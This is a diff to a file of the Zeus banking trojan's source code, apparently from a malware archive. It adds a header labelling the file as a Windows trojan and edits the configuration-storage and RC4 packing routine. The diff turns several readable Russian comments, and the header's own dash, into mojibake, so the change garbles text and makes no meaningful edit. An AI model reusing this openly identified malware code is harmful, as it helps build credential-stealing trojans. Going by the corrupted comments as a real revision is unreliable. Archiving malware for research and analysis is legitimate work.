@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "binstorage.h"
@@ -40,7 +51,7 @@ BinStorage::STORAGE *BinStorage::_createEmpty(void)
 bool BinStorage::_addItem(STORAGE **binStorage, DWORD id, DWORD flags, void *data, DWORD dataSize)
 {
   DWORD newStorageSize = (*binStorage)->size + sizeof(ITEM) + dataSize;
-  if(newStorageSize > (*binStorage)->size /*не пошло ли по кругу*/ && id > 0 && Mem::reallocEx(binStorage, newStorageSize))
+  if(newStorageSize > (*binStorage)->size /*пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ*/ && id > 0 && Mem::reallocEx(binStorage, newStorageSize))
   {
     STORAGE *p = *binStorage;
     ITEM *item = (ITEM *)(((LPBYTE)p) + p->size);
@@ -232,9 +243,9 @@ DWORD BinStorage::_pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key
   ITEM *curItem = NULL;
 
   /*
-    Приминение флагов ITEMF_COMBINE_*.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ ITEMF_COMBINE_*.
     
-    FIXME: Разработать оптимизацию даже при !(dwFlags & PACKF_FINAL_MODE).
+    FIXME: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ !(dwFlags & PACKF_FINAL_MODE).
   */
   if(flags & PACKF_FINAL_MODE)while((curItem = _getNextItem(oldStorage, curItem)))if(curItem->id > 0)
   {
